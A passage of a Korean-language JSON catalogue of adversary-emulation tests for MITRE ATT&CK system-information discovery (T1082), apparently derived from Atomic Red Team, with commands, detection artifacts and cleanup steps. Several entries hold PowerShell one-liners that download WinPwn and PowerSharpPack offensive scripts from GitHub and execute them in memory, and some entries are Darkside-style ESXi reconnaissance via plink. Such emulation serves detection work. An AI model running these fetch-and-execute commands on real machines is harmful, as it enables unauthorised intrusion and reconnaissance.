          {
            "path": ".\\LocalPrivEsc",
            "description": "로컬 권한 상승 관련 결과 디렉터리"
          },
          {
            "path": ".\\LocalRecon",
            "description": "로컬 정찰 결과 디렉터리"
          },
          {
            "path": ".\\Vulnerabilities",
            "description": "취약점 분석 결과 디렉터리"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "oldchecks 실행에 사용",
            "commandline_pattern": "*oldchecks*"
          }
        ],
        "network": [
          {
            "description": "GitHub WinPwn 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "DomainRecon, Exploitation, LocalPrivEsc, LocalRecon, Vulnerabilities 폴더를 삭제해 테스트 흔적을 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "345cb8e4-d2de-4011-a580-619cf5a9e2d7"
      }
    },
    {
      "test_id": "T1082-9",
      "name": "WinPwn - General privesc checks (otherchecks)",
      "platforms": ["windows"],
      "summary": "WinPwn의 otherchecks 기능으로 일반적인 권한 상승 관련 설정들을 광범위하게 점검하는 동작을 모사한다.",
      "procedure": [
        "WinPwn.ps1을 다운로드해 로드한다.",
        "otherchecks -noninteractive -consoleoutput을 실행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput"
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 스크립트 실행 허용."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "otherchecks 실행에 사용",
            "commandline_pattern": "*otherchecks*"
          }
        ],
        "network": [
          {
            "description": "GitHub WinPwn 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "파일 생성이 없다면 별도 정리 단계는 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed"
      }
    },
    {
      "test_id": "T1082-10",
      "name": "WinPwn - GeneralRecon",
      "platforms": ["windows"],
      "summary": "WinPwn GeneralRecon 기능을 사용해 계정, 서비스, 네트워크 등 일반 시스템 정보를 폭넓게 수집하는 정찰 동작을 모사한다.",
      "procedure": [
        "WinPwn.ps1을 다운로드해 로드한다.",
        "Generalrecon -consoleoutput -noninteractive 명령으로 종합 정찰을 수행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive"
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 스크립트 실행 허용."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Generalrecon 실행에 사용",
            "commandline_pattern": "*Generalrecon*"
          }
        ],
        "network": [
          {
            "description": "GitHub WinPwn 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "별도 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "7804659b-fdbf-4cf6-b06a-c03e758590e8"
      }
    },
    {
      "test_id": "T1082-11",
      "name": "WinPwn - Morerecon",
      "platforms": ["windows"],
      "summary": "WinPwn Morerecon 기능을 통해 추가적인 로컬 시스템 정보를 수집하는 정찰 동작을 모사한다.",
      "procedure": [
        "WinPwn.ps1을 다운로드해 로드한다.",
        "Morerecon -noninteractive -consoleoutput을 실행해 세부 정보를 수집한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput"
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 스크립트 실행 허용."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Morerecon 실행에 사용",
            "commandline_pattern": "*Morerecon*"
          }
        ],
        "network": [
          {
            "description": "GitHub WinPwn 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "특별한 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "3278b2f6-f733-4875-9ef4-bfed34244f0a"
      }
    },
    {
      "test_id": "T1082-12",
      "name": "WinPwn - RBCD-Check",
      "platforms": ["windows"],
      "summary": "WinPwn의 RBCD-Check 기능을 사용해 도메인 환경에서 Resource-Based Constrained Delegation 취약 구성을 점검하는 정찰 동작을 모사한다.",
      "procedure": [
        "WinPwn.ps1을 다운로드해 로드한다.",
        "RBCD-Check -consoleoutput -noninteractive 명령을 실행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive"
        }
      ],
      "prerequisites": [
        "도메인 환경이어야 의미 있는 결과가 나온다.",
        "도메인 정보 조회 권한(일반 도메인 사용자 이상)이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "RBCD-Check 실행에 사용",
            "commandline_pattern": "*RBCD-Check*"
          }
        ],
        "network": [
          {
            "description": "GitHub WinPwn 리포지토리 및 도메인 컨트롤러로의 통신"
          }
        ]
      },
      "cleanup": [
        "도메인 설정을 변경하지 않으므로 별도 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "dec6a0d8-bcaf-4c22-9d48-2aee59fb692b"
      }
    },
    {
      "test_id": "T1082-13",
      "name": "PowerSharpPack - Watson으로 누락 패치 검색",
      "platforms": ["windows"],
      "summary": "PowerSharpPack의 Invoke-SharpWatson를 사용해 시스템에 적용되지 않은 Windows 패치를 탐지하는 정찰 동작을 모사한다.",
      "procedure": [
        "GitHub에서 Invoke-SharpWatson.ps1을 다운로드해 PowerShell 메모리로 로드한다.",
        "Invoke-watson을 실행해 누락된 패치 및 취약점을 식별한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson"
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 스크립트 실행 허용."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "SharpWatson 실행에 사용",
            "commandline_pattern": "*Invoke-watson*"
          }
        ],
        "network": [
          {
            "description": "GitHub PowerSharpPack 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "파일을 남기지 않으면 메모리 내 흔적만 존재한다."
      ],
      "metadata": {
        "atomic_source_id": "07b18a66-6304-47d2-bad0-ef421eb2e107"
      }
    },
    {
      "test_id": "T1082-14",
      "name": "PowerSharpPack - SharpUp로 Privesc 벡터 점검",
      "platforms": ["windows"],
      "summary": "Invoke-SharpUp를 사용해 서비스, UAC, 파일·레지스트리 권한 등 일반적인 권한 상승 벡터를 자동 점검하는 동작을 모사한다.",
      "procedure": [
        "Invoke-SharpUp.ps1을 GitHub에서 다운로드해 로드한다.",
        "Invoke-SharpUp -command \"audit\"으로 전체 감사(audit)를 수행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\""
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 실행 정책이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "SharpUp 감사 실행",
            "commandline_pattern": "*Invoke-SharpUp*"
          }
        ],
        "network": [
          {
            "description": "GitHub PowerSharpPack 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "콘솔 출력 위주이므로 추가 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "efb79454-1101-4224-a4d0-30c9c8b29ffc"
      }
    },
    {
      "test_id": "T1082-15",
      "name": "PowerSharpPack - Seatbelt를 이용한 호스트 점검",
      "platforms": ["windows"],
      "summary": "Seatbelt를 호출해 브라우저, 크리덴셜, 로깅 설정 등 다양한 보안 관련 정보를 수집하는 정찰 동작을 모사한다.",
      "procedure": [
        "Invoke-Seatbelt.ps1을 GitHub에서 다운로드해 PowerShell로 로드한다.",
        "Invoke-Seatbelt -Command \"-group=all\"로 모든 그룹 체크를 수행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\""
        }
      ],
      "prerequisites": [
        "인터넷 연결 및 PowerShell 실행 정책 허용."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Seatbelt 호출 및 실행",
            "commandline_pattern": "*Invoke-Seatbelt*"
          }
        ],
        "network": [
          {
            "description": "GitHub PowerSharpPack 리포지토리 접근 트래픽"
          }
        ]
      },
      "cleanup": [
        "결과를 파일로 저장하지 않으면 콘솔 로그만 남는다."
      ],
      "metadata": {
        "atomic_source_id": "5c16ceb4-ba3a-43d7-b848-a13c1f216d95"
      }
    },
    {
      "test_id": "T1082-16",
      "name": "System Information Discovery with WMIC",
      "platforms": ["windows"],
      "summary": "WMIC와 Get-WmiObject를 사용해 CPU, 메모리, 메인보드, BIOS, GPU, OS, 디스크 정보를 상세하게 조회하는 정찰 동작을 모사한다.",
      "procedure": [
        "WMIC 명령으로 CPU, 메모리, 보드, BIOS, GPU, OS, 디스크 정보를 각각 조회한다.",
        "마지막으로 PowerShell에서 Get-WmiObject win32_bios를 실행해 BIOS 객체를 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic cpu get name & wmic MEMPHYSICAL get MaxCapacity & wmic baseboard get product & wmic baseboard get version & wmic bios get SMBIOSBIOSVersion & wmic path win32_VideoController get name & wmic path win32_VideoController get DriverVersion & wmic path win32_VideoController get VideoModeDescription & wmic OS get Caption,OSArchitecture,Version & wmic DISKDRIVE get Caption & powershell -c \"Get-WmiObject win32_bios\""
        }
      ],
      "prerequisites": [
        "WMIC와 PowerShell이 설치된 Windows 환경이어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "여러 하드웨어/OS 정보를 조회",
            "commandline_pattern": "wmic *"
          },
          {
            "name": "powershell.exe",
            "description": "Get-WmiObject win32_bios 호출",
            "commandline_pattern": "*Get-WmiObject win32_bios*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회성 명령이므로 별도 정리가 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "8851b73a-3624-4bf7-8704-aa312411565c"
      }
    },
    {
      "test_id": "T1082-17",
      "name": "gatherNetworkInfo.vbs를 이용한 시스템·네트워크 정보 수집",
      "platforms": ["windows"],
      "summary": "기본 제공 스크립트 gathernetworkinfo.vbs를 실행해 OS, DNS, 방화벽, 네트워크 구성 정보를 수집하는 동작을 모사한다.",
      "procedure": [
        "C:\\Windows\\System32\\gatherNetworkInfo.vbs 파일이 존재하는지 확인한다.",
        "관리자 권한으로 wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs를 실행한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs"
        }
      ],
      "prerequisites": [
        "gatherNetworkInfo.vbs가 System32에 존재해야 한다.",
        "관리자 권한으로 실행하는 것이 권장된다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Windows\\System32\\config\\*",
            "description": "스크립트 실행 결과로 생성될 수 있는 정보 수집 파일"
          },
          {
            "path": "C:\\Windows\\System32\\reg\\*",
            "description": "레지스트리 관련 정보 결과 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wscript.exe",
            "description": "gatherNetworkInfo.vbs 실행에 사용",
            "commandline_pattern": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "config 및 reg 하위에 생성된 결과 파일을 삭제해 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "4060ee98-01ae-4c8e-8aad-af8300519cc7"
      }
    },
    {
      "test_id": "T1082-18",
      "name": "Geo 레지스트리를 이용한 국가 코드 조회",
      "platforms": ["windows"],
      "summary": "HKCU 국제 설정 Geo 키를 조회해 시스템에 설정된 국가 코드 정보를 확인하는 지오펜스 관련 정찰 동작을 모사한다.",
      "procedure": [
        "reg query로 HKEY_CURRENT_USER\\Control Panel\\International\\Geo 키를 조회한다.",
        "Nation 등 값을 통해 국가 코드를 파악한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\""
        }
      ],
      "prerequisites": [
        "현재 사용자 컨텍스트에서 HKCU 레지스트리 읽기 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKCU\\Control Panel\\International\\Geo",
            "description": "국가 코드 설정이 저장된 레지스트리 키"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "Geo 키 조회에 사용",
            "commandline_pattern": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "읽기만 수행하므로 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "96be6002-9200-47db-94cb-c3e27de1cb36"
      }
    },
    {
      "test_id": "T1082-19",
      "name": "BIOS 정보 레지스트리 조회",
      "platforms": ["windows"],
      "summary": "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System에서 BIOS 및 Video BIOS 버전을 조회해 가상화·샌드박스 탐지 등에 활용 가능한 정보를 수집하는 동작을 모사한다.",
      "procedure": [
        "reg query로 SystemBiosVersion 값을 조회한다.",
        "reg query로 VideoBiosVersion 값을 조회한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion & reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion"
        }
      ],
      "prerequisites": [
        "HKLM 하드웨어 영역 레지스트리 읽기 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\HARDWARE\\DESCRIPTION\\System",
            "description": "BIOS 관련 정보가 포함된 레지스트리 키"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "BIOS 정보 조회에 사용",
            "commandline_pattern": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회만 수행하므로 정리 불필요."
      ],
      "metadata": {
        "atomic_source_id": "f2f91612-d904-49d7-87c2-6c165d23bead"
      }
    },
    {
      "test_id": "T1082-20",
      "name": "ESXi - VM Discovery using ESXCLI (plink 사용)",
      "platforms": ["windows"],
      "summary": "Windows에서 plink.exe로 ESXi 서버에 SSH 접속 후 esx_vmdiscovery.txt에 정의된 ESXCLI 명령을 실행해 VM 목록을 수집하는 동작을 모사한다.",
      "procedure": [
        "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe가 존재하는지 확인한다.",
        "없을 경우 원격에서 plink.exe를 다운로드한다.",
        "plink -ssh -l <user> -pw <pass> -m esx_vmdiscovery.txt로 ESXCLI 스크립트를 실행한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "echo \"\" | #{plink_file} #{vm_host} -ssh -l #{vm_user} -pw #{vm_pass} -m #{cli_script}"
        }
      ],
      "prerequisites": [
        "ESXi 호스트에 SSH로 접근 가능한 네트워크 환경이어야 한다.",
        "plink.exe 및 esx_vmdiscovery.txt가 준비되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe",
            "description": "ESXi 접속용 plink 클라이언트"
          },
          {
            "path": "PathToAtomicsFolder\\T1082\\src\\esx_vmdiscovery.txt",
            "description": "ESXCLI VM 열거 명령이 포함된 스크립트 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "plink.exe",
            "description": "ESXi 서버에 SSH 접속해 ESXCLI 명령 실행",
            "commandline_pattern": "plink.exe * -ssh * -m *esx_vmdiscovery.txt*"
          }
        ],
        "network": [
          {
            "description": "Windows → ESXi 서버로의 SSH(포트 22) 트래픽"
          }
        ]
      },
      "cleanup": [
        "테스트 후 plink.exe와 esx_vmdiscovery.txt를 삭제해 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "2040405c-eea6-4c1c-aef3-c2acc430fac9"
      }
    },
    {
      "test_id": "T1082-21",
      "name": "ESXi - Darkside 스타일 시스템 정보 수집",
      "platforms": ["windows"],
      "summary": "Darkside 랜섬웨어가 사용한 것과 유사한 ESXCLI 명령을 esx_darkside_discovery.txt로 실행해 ESXi 호스트 정보를 수집하는 동작을 모사한다.",
      "procedure": [
        "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe를 준비한다.",
        "esx_darkside_discovery.txt에 Darkside에서 사용한 ESXCLI 명령을 포함시킨다.",
        "plink -ssh -l <user> -pw <pass> -m esx_darkside_discovery.txt 명령을 실행한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "echo \"\" | #{plink_file} #{vm_host} -ssh -l #{vm_user} -pw #{vm_pass} -m #{cli_script}"
        }
      ],
      "prerequisites": [
        "ESXi 호스트에 SSH로 접근 가능한 환경이어야 한다.",
        "esx_darkside_discovery.txt 파일이 준비되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe",
            "description": "ESXi 접속용 plink 클라이언트"
          },
          {
            "path": "PathToAtomicsFolder\\T1082\\src\\esx_darkside_discovery.txt",
            "description": "Darkside 스타일 ESXCLI 명령 모음 스크립트"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "plink.exe",
            "description": "Darkside 스타일 ESXCLI 명령 실행",
            "commandline_pattern": "plink.exe * -m *esx_darkside_discovery.txt*"
          }
        ],
        "network": [
          {
            "description": "Windows → ESXi 서버 SSH 트래픽"
          }
        ]
      },
      "cleanup": [
        "테스트용 plink와 esx_darkside_discovery.txt를 삭제해 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "f89812e5-67d1-4f49-86fa-cbc6609ea86a"
      }
    },
    {
      "test_id": "T1082-22",
      "name": "Get-CimInstance로 OS 정보 조회",
      "platforms": ["windows"],
      "summary": "PowerShell Get-CimInstance Win32_OperatingSystem을 사용해 OS 이름, 버전, 서비스팩, 아키텍처, 컴퓨터 이름, Windows 디렉터리를 조회하는 정찰 동작을 모사한다.",
      "procedure": [
        "PowerShell에서 Win32_OperatingSystem CIM 클래스를 조회한다.",
        "Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory 필드를 선택한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-Null"
        }
      ],
      "prerequisites": [
        "PowerShell 3.0 이상이 설치되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "CIM 기반 OS 정보 조회",
            "commandline_pattern": "Get-CimInstance Win32_OperatingSystem*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회만 수행하므로 정리 단계는 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "70e13ef4-5a74-47e4-9d16-760b41b0e2db"
      }
    },
    {
      "test_id": "T1082-23",
      "name": "ver 명령으로 OS 버전 확인",
      "platforms": ["windows"],
      "summary": "CMD의 ver 명령을 사용해 Windows 버전을 간단히 확인하는 정찰 동작을 모사한다.",
      "procedure": [
        "cmd.exe에서 ver 명령을 실행한다.",
        "출력된 OS 버전 문자열을 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "ver"
        }
      ],
      "prerequisites": [
        "CMD 접근 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "ver 명령 실행에 사용",
            "commandline_pattern": "ver"
          }
        ],
        "network": []
      },
      "cleanup": [
        "별도 정리 필요 없음."
      ],
      "metadata": {
        "atomic_source_id": "f6ecb109-df24-4303-8d85-1987dbae6160"
      }
    },
    {
      "test_id": "T1082-24",
      "name": "vssadmin으로 볼륨 섀도 복사본 나열",
      "platforms": ["windows"],
      "summary": "vssadmin.exe list shadows를 사용해 시스템에 존재하는 볼륨 섀도 복사본과 생성 시각, 위치를 열람하는 동작을 모사한다.",
      "procedure": [
        "관리자 권한으로 CMD를 실행한다.",
        "vssadmin.exe list shadows 명령을 수행한다.",
        "출력된 각 섀도 복사본의 정보(볼륨, 생성 시각 등)를 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "vssadmin.exe list shadows"
        }
      ],
      "prerequisites": [
        "관리자 권한이 필요하다.",
        "시스템에 볼륨 섀도 복사본이 존재해야 의미 있는 결과가 나온다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "vssadmin.exe",
            "description": "볼륨 섀도 복사본 정보 조회",
            "commandline_pattern": "vssadmin.exe list shadows*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회만 수행하므로 섀도 복사본에는 영향을 주지 않는다."
      ],
      "metadata": {
        "atomic_source_id": "7161b085-816a-491f-bab4-d68e974b7995"
      }
    },
    {
      "test_id": "T1082-25",
      "name": "PowerShell로 시스템 Locale·지역 설정 조회",
      "platforms": ["windows"],
      "summary": "Get-Culture 결과를 %TMP%\\a.txt에 저장해 시스템의 문화권/언어 설정을 수집하는 동작을 모사한다.",
      "procedure": [
        "CMD에서 powershell.exe -c 'Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt'를 실행한다.",
        "TMP 디렉터리에 생성된 a.txt를 통해 언어·지역 설정을 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "powershell.exe -c 'Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt'"
        }
      ],
      "prerequisites": [
        "PowerShell 실행이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TMP%\\a.txt",
            "description": "Get-Culture 결과(지역·언어 설정)를 저장한 텍스트 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-Culture 실행 및 파일로 기록",
            "commandline_pattern": "Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt"
          }
        ],
        "network": []
      },
      "cleanup": [
        "%TMP%\\a.txt 파일을 삭제해 흔적을 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "ce479c1a-e8fa-42b2-812a-96b0f2f4d28a"
      }
    },
    {
      "test_id": "T1082-26",
      "name": "gdr로 파일 시스템 드라이브 나열",
      "platforms": ["windows"],
      "summary": "PowerShell gdr -PSProvider 'FileSystem' 명령을 사용해 시스템에 연결된 파일 시스템 드라이브 목록을 조회하는 동작을 모사한다.",
      "procedure": [
        "CMD에서 powershell.exe -c 'gdr -PSProvider \"FileSystem\"'을 실행한다.",
        "결과로 출력되는 드라이브 문자와 경로를 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "powershell.exe -c \"gdr -PSProvider 'FileSystem'\""
        }
      ],
      "prerequisites": [
        "PowerShell 사용이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "gdr 명령 실행에 사용",
            "commandline_pattern": "gdr -PSProvider 'FileSystem'"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회성 명령으로 별도 정리가 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "c187c9bc-4511-40b3-aa10-487b2c70b6a5"
      }
    },
    {
      "test_id": "T1082-27",
      "name": "레지스트리로 OS ProductName 조회",
      "platforms": ["windows"],
      "summary": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion 키의 ProductName 값을 조회해 OS 에디션 이름을 확인하는 동작을 모사한다.",
      "procedure": [
        "reg query로 CurrentVersion 키의 ProductName 값을 조회한다.",
        "출력된 제품명을 통해 OS 종류를 식별한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName"
        }
      ],
      "prerequisites": [
        "레지스트리 HKLM 영역 읽기 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            "description": "OS ProductName, 빌드 정보 등이 저장된 핵심 키"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "ProductName 조회에 사용",
            "commandline_pattern": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회만 수행하므로 정리 작업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "be3b5fe3-a575-4fb8-83f6-ad4a68dd5ce7"
      }
    },
    {
      "test_id": "T1082-28",
      "name": "레지스트리로 OS Build Number 조회",
      "platforms": ["windows"],
      "summary": "같은 CurrentVersion 키에서 CurrentBuildNumber 값을 조회해 OS 빌드 번호를 확인하는 동작을 모사한다.",
      "procedure": [
        "reg query로 CurrentBuildNumber 값을 조회한다.",
        "빌드 번호를 기준으로 취약 버전 여부를 판단할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber"
        }
      ],
      "prerequisites": [
        "레지스트리 HKLM 영역 읽기 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            "description": "CurrentBuildNumber 값을 포함하는 레지스트리 키"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "CurrentBuildNumber 조회에 사용",
            "commandline_pattern": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber"
          }
        ],
        "network": []
      },
      "cleanup": [
        "별도의 정리 단계는 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "acfcd709-0013-4f1e-b9ee-bc1e7bafaaec"
      }
    }
  ]
},
{
  "technique_id": "T1083",
  "technique_name": "File and Directory Discovery",
  "tactic": "Discovery",
  "description": "이 ATT&CK 기법은 공격자가 시스템 내 파일과 디렉터리 구조를 광범위하게 열람하는 행위를 의미한다. 민감 정보 저장 위치, 백업 파일, 네트워크 공유 및 사용자의 주요 작업 디렉터리를 파악하기 위해 사용된다. 명령 프롬프트, PowerShell, 외부 도구 등을 활용해 전체 드라이브와 사용자 폴더를 재귀적으로 열거하는 것이 특징이다.",
  "tests": [
    {
      "test_id": "T1083-1",
      "name": "File and Directory Discovery (cmd.exe)",
      "platforms": [
        "windows"
      ],
